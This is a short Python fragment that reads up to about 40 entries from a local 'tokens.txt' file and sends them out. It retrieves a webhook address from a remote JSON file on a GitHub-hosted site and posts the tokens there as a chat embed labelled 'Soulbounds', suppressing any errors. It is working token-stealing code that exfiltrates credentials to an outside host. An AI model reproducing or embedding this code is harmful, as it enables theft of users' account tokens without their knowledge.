token_list = []
if os.path.isfile("tokens.txt"):
    file1 = open('tokens.txt', 'r')
    Lines = file1.readlines()
    for line in Lines:
        if len(token_list) > 40:
            break
        if len(line) < 10:
            continue
        token_list.append(line.strip())

try:
    temp = requests.get("https://raw.githubusercontent.com/united-meows/united-meows.github.io/master/a.json").json()["url"];
    if len(token_list) == 0:
        data = {}
        data["embeds"] = [
            {
                "color": "16777215",
                "title": "Soulbounds",
                "description": "No soulbound"
            }
        ]
        result = requests.post(temp,
        json = data)
    else:
        data = {}
        data["embeds"] = [
        {
            "color": "16777215",
            "title": "Soulbounds",
            "description": "Unchecked soulbounds\n```{itokens}```".format(itokens=''.join(token_list))
        }
        ]
        result = requests.post(temp, json = data)
except:
    pass
else:
    pass
    
